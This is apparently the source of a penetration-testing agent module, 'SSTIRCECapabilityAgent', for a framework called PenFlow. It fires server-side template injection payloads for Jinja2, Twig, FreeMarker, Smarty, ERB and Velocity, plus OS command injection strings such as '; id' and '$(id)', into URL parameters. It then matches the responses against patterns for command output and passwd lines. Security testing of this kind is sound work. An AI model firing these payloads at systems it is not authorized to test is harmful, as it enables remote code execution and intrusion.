"""
SSTIRCECapabilityAgent — Multi-Engine SSTI & OS Command Execution Agent for PenFlow.

Engine Payload Matrix:
  - Jinja2 (Python): {{7*'7'}} → 7777777, {{config}}
  - Twig (PHP): {{7*7}} → 49, {{_self.env.registerUndefinedFilterCallback("exec")}}
  - FreeMarker (Java): ${7*7} → 49, <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
  - Smarty (PHP): {7*7} → 49, {system('id')}
  - ERB (Ruby): <%= 7*7 %> → 49, <%= `id` %>
  - Velocity (Java): #set($x=7*7)$x → 49
  - Pebble (Java): {{7*7}} → 49

OS Command Injection Vectors:
  - ; id, | id, & id, `id`, $(id), %0aid, powershell -c "dir"
"""
import re
from typing import List, Dict, Any, Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from penflow.agents.capability_agent import BaseCapabilityAgent
from penflow.capabilities.capability import Capability
from penflow.capabilities.execution_context import CapabilityExecutionContext
from penflow.infrastructure.logger import get_logger

logger = get_logger("penflow.agents.ssti_rce")

# Multi-engine SSTI evaluation matrix
SSTI_ENGINE_PAYLOADS = [
    {
        "engine": "Jinja2 (Python)",
        "probe": "{{7*'7'}}",
        "expected_output": "7777777",
        "rce_payload": "{{self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()}}",
        "severity": "critical"
    },
    {
        "engine": "Twig (PHP)",
        "probe": "{{7*7}}",
        "expected_output": "49",
        "rce_payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "severity": "critical"
    },
    {
        "engine": "FreeMarker (Java)",
        "probe": "${7*7}",
        "expected_output": "49",
        "rce_payload": '<#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }',
        "severity": "critical"
    },
    {
        "engine": "Smarty (PHP)",
        "probe": "{7*7}",
        "expected_output": "49",
        "rce_payload": "{system('id')}",
        "severity": "critical"
    },
    {
        "engine": "ERB (Ruby)",
        "probe": "<%= 7*7 %>",
        "expected_output": "49",
        "rce_payload": "<%= `id` %>",
        "severity": "critical"
    },
    {
        "engine": "Velocity (Java)",
        "probe": "#set($x=7*7)$x",
        "expected_output": "49",
        "rce_payload": "#set($e=\"e\")#set($class=$e.getClass().forName(\"java.lang.Runtime\"))",
        "severity": "high"
    },
]

# OS Command Injection Payloads
RCE_PAYLOADS = [
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
    "\nid",
    "& whoami",
    "; whoami",
]

RCE_OUTPUT_PATTERNS = [
    r"uid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)",  # Linux id output
    r"root:x:0:0:",                         # passwd read
    r"windows\s+ip\s+configuration",        # ipconfig output
    r"volume\s+in\s+drive\s+[a-z]\s+has\s+no\s+label", # dir output
]


class SSTIRCECapabilityAgent(BaseCapabilityAgent):
    """
    Elite SSTI & OS Command Injection Specialist Agent.
    Identifies template engines via mathematical evaluation signatures and escalates to RCE.
    """
    def __init__(self, priority: int = 10):
        super().__init__(agent_name="SSTIRCECapabilityAgent", priority=priority)

    def get_capabilities(self) -> List[Capability]:
        return [
            Capability(
                id="ssti_analysis",
                name="Server-Side Template Injection (SSTI Multi-Engine)",
                description="Tests dynamic rendering parameters against Jinja2, Twig, FreeMarker, Smarty, ERB, and Velocity engines",
                priority=self.priority,
                tags=["ssti", "template", "rce", "jinja2", "twig", "freemarker"]
            ),
            Capability(
                id="command_injection",
                name="OS Command Injection / Arbitrary Execution",
                description="Tests parameters for shell command separators, command substitution, and process execution",
                priority=self.priority,
                tags=["rce", "command_injection", "system", "os"]
            ),
        ]

    async def execute(self, capability_id: str, context: CapabilityExecutionContext) -> Dict[str, Any]:
        logger.info(f"[SSTIRCECapabilityAgent] Executing capability '{capability_id}' on asset '{context.asset}'")

        http_client = context.get_http_client()
        targets = self._collect_targets(context)

        findings: List[Dict[str, Any]] = []

        for target in targets[:8]:
            if capability_id == "ssti_analysis":
                result = await self._test_ssti(http_client, target)
            else:
                result = await self._test_rce(http_client, target)

            if result:
                findings.append(result)
                if result.get("is_vulnerable") and result.get("confidence", 0) >= 0.90:
                    break

        confirmed = [f for f in findings if f.get("is_vulnerable")]
        is_vuln = len(confirmed) > 0
        best = confirmed[0] if confirmed else (findings[0] if findings else {})

        return {
            "status": "COMPLETED",
            "agent": self.name,
            "capability": capability_id,
            "asset": context.asset,
            "is_vulnerable": is_vuln,
            "confidence_score": best.get("confidence", 0.0),
            "evidence": {
                "target_url": best.get("target_url", f"https://{context.asset}"),
                "engine": best.get("engine", ""),
                "tested_endpoints_count": len(targets),
                "reasoning": best.get("reasoning", "Template/command injection not detected on tested parameters."),
                "findings": findings,
                "evidence_exchanges": [f.get("exchange", {}) for f in findings if f.get("exchange")]
            }
        }

    def _collect_targets(self, context: CapabilityExecutionContext) -> List[Dict[str, Any]]:
        targets = []
        seen = set()

        for obs in context.observations:
            data = obs.get("data", {}) if isinstance(obs, dict) else {}
            if isinstance(data, dict):
                for ep in data.get("endpoints", []):
                    if isinstance(ep, dict) and ep.get("url"):
                        url = ep["url"]
                        parsed = urlparse(url)
                        q_params = list(parse_qs(parsed.query).keys())
                        if url not in seen and q_params:
                            targets.append({"url": url, "params": q_params})
                            seen.add(url)

        if not targets:
            base = f"https://{context.asset}"
            targets.append({"url": f"{base}/api/v1/preview?template=test", "params": ["template"]})
            targets.append({"url": f"{base}/render?msg=hello", "params": ["msg"]})

        return targets

    async def _test_ssti(self, http_client: Any, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        base_url = target["url"]
        param = target["params"][0]
        parsed = urlparse(base_url)

        for engine_item in SSTI_ENGINE_PAYLOADS:
            probe = engine_item["probe"]
            expected = engine_item["expected_output"]

            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [probe]
            inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

            try:
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="GET",
                    url=inj_url
                )
                resp = exch.response
                if resp and resp.status_code == 200 and resp.body_text:
                    body = resp.body_text
                    # Key check: expected output is in body AND raw probe string is NOT literally reflected
                    if expected in body and probe not in body:
                        return {
                            "vector": "ssti_evaluation",
                            "engine": engine_item["engine"],
                            "target_url": inj_url,
                            "param_name": param,
                            "is_vulnerable": True,
                            "confidence": 0.98,
                            "reasoning": f"CRITICAL SSTI ({engine_item['engine']}): Payload '{probe}' evaluated to '{expected}' in response body.",
                            "exchange": exch.to_dict()
                        }
            except Exception as e:
                logger.debug(f"[SSTIRCEAgent] SSTI probe error for {engine_item['engine']}: {e}")

        return None

    async def _test_rce(self, http_client: Any, target: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        base_url = target["url"]
        param = target["params"][0]
        parsed = urlparse(base_url)

        for payload in RCE_PAYLOADS:
            qs = parse_qs(parsed.query, keep_blank_values=True)
            qs[param] = [f"test{payload}"]
            inj_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

            try:
                exch = await http_client.send_as_identity(
                    identity_id="anonymous_guest",
                    method="GET",
                    url=inj_url
                )
                resp = exch.response
                if resp and resp.body_text:
                    body = resp.body_text
                    for pattern in RCE_OUTPUT_PATTERNS:
                        if re.search(pattern, body, re.IGNORECASE):
                            return {
                                "vector": "os_command_injection",
                                "target_url": inj_url,
                                "param_name": param,
                                "is_vulnerable": True,
                                "confidence": 0.99,
                                "reasoning": f"CRITICAL OS Command Injection: Payload '{payload}' returned process execution output matching '{pattern}'.",
                                "exchange": exch.to_dict()
                            }
            except Exception as e:
                logger.debug(f"[SSTIRCEAgent] RCE probe error: {e}")

        return None
